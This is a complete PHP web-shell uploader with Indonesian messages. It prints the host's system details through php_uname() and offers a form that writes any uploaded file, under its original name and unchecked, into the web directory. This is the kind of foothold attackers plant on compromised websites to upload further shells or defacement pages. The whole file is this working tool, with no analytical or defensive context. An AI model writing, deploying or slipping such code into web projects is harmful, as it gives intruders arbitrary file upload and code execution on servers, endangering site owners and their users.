<?php
echo "<b>Ngehe</b>";
echo "<br>".php_uname()."<br>";
echo "<form method='post' enctype='multipart/form-data'>
<input type='file' name='upl'><input type='submit' name='upload'>
</form>";
if($_POST['upload']) {
    if(@copy($_FILES['upl']['tmp_name'], $_FILES['upl']['name'])) {
    echo "Sukses";
    } else {
    echo "Gagal";
    }
}
?>
